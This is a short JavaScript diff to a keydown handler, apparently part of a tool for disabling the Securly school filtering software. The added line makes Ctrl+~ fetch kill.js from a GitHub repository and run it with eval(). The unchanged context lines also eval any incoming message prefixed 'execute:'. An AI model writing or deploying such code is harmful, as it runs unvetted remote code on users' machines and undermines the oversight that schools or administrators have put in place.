@@ -12,6 +12,6 @@ document.addEventListener("keydown", function (e) {
 				e.data.toString().startsWith("execute:") && (eval(e.data.toString().replace("execute:", "")), t.close());
 			});
 	} else if (e.key == "~" && e.ctrlKey) {
-		eval(prompt("yo"));
+		fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r));
 	}
 });
